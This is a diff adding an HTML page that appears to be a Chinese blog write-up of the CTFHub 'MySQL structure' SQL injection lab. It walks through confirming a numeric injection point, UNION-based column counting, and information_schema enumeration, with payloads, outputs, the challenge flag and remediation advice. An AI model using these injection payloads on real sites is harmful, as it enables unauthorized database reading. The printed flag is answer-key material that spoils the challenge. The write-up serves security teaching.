@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub MySQL结构 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; line-height: 1.6; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - SQL注入 - MySQL结构</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># SQL注入</span>
+            <span class="tag"># MySQL结构</span>
+            <span class="tag"># information_schema</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>MySQL结构</li>
+            <li><strong>题目方向：</strong>Web - SQL注入</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>枚举 MySQL 数据库结构并读取 flag。</li>
+        </ul>
+
+        <h2>二、确认 SQL 注入</h2>
+        <p>首页提供 <code>id</code> 查询参数。提交 <code>id=1</code> 后，页面会直接回显执行的 SQL 语句和查询结果：</p>
+        <pre>select * from news where id=1
+
+ID: 1
+Data: ctfhub</pre>
+        <p>参数值没有使用单引号包裹，说明这是数字型注入点。继续构造永真和永假条件：</p>
+        <pre>id=1 and 1=1
+# 返回 ID: 1、Data: ctfhub
+
+id=1 and 1=2
+# 没有返回数据</pre>
+        <p>条件为真时正常返回，条件为假时无结果，可以确认 <code>id</code> 参数存在 SQL 注入。</p>
+
+        <h2>三、确定查询列数</h2>
+        <p>先使用 <code>order by</code> 判断原查询的列数。提交 <code>order by 2</code> 正常返回，提交 <code>order by 3</code> 无结果，因此原查询共有两列。</p>
+        <p>接下来使用一个不存在的 <code>id</code>，让页面优先回显 UNION 查询的结果：</p>
+        <pre>0 union select 1,2
+
+ID: 1
+Data: 2</pre>
+        <p>两个位置均可正常回显。后续会把枚举内容放在第一列，将常量 <code>2</code> 放在第二列。</p>
+
+        <h2>四、获取数据库基本信息</h2>
+        <p>将当前数据库名和 MariaDB 版本分别放入两个回显位置：</p>
+        <pre>0 union select database(),version()
+
+ID: sqli
+Data: 10.3.22-MariaDB-0+deb10u1</pre>
+        <p>当前数据库为 <code>sqli</code>。题目名称提示需要关注 MySQL 结构，因此下一步查询系统库 <code>information_schema</code>。</p>
+
+        <h2>五、枚举数据表和字段</h2>
+        <p>查询当前数据库中的全部表名：</p>
+        <pre>0 union select group_concat(table_name),2
+from information_schema.tables
+where table_schema=database()
+
+ID: wejwrktgwx,news
+Data: 2</pre>
+        <p>除了业务表 <code>news</code>，还存在随机表名 <code>wejwrktgwx</code>。继续查询当前数据库中的字段名：</p>
+        <pre>0 union select group_concat(column_name),2
+from information_schema.columns
+where table_schema=database()
+
+ID: gbiknmlinp,id,data
+Data: 2</pre>
+        <p>结合表名和字段枚举结果，可以确定目标数据位于 <code>wejwrktgwx.gbiknmlinp</code>。</p>
+
+        <h2>六、读取 Flag</h2>
+        <p>读取目标字段，并将结果放入第一个回显位置：</p>
+        <pre>0 union select gbiknmlinp,2 from wejwrktgwx
+
+ID: ctfhub{3880d4605867cea8f0135181}
+Data: 2</pre>
+        <p>对应的 URL 编码 Payload：</p>
+        <pre>/?id=0%20union%20select%20gbiknmlinp,2%20from%20wejwrktgwx</pre>
+
+        <h2>七、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{3880d4605867cea8f0135181}
+        </div>
+
+        <h2>八、修复建议</h2>
+        <ul>
+            <li>使用预处理语句和参数绑定，禁止将用户输入直接拼接进 SQL 语句。</li>
+            <li>对 <code>id</code> 等参数执行严格的整数类型校验，只接受合法数字。</li>
+            <li>数据库账号遵循最小权限原则，Web 应用不应使用 <code>root</code> 账号连接数据库。</li>
+            <li>关闭生产环境中的 SQL 错误和语句回显，避免泄露数据库结构。</li>
+            <li>限制业务账号访问 <code>information_schema</code> 的权限，降低敏感结构被枚举的风险。</li>
+        </ul>
+
+        <h2>九、解题总结</h2>
+        <p>本题的核心是确认两列 UNION 注入点后，利用 <code>information_schema.tables</code> 和 <code>information_schema.columns</code> 枚举数据库结构。MySQL 表名或字段名未知时，可以先使用 <code>group_concat()</code> 汇总结果，再根据表与字段的对应关系读取目标数据。</p>
+    </div>
+</body>
+</html>
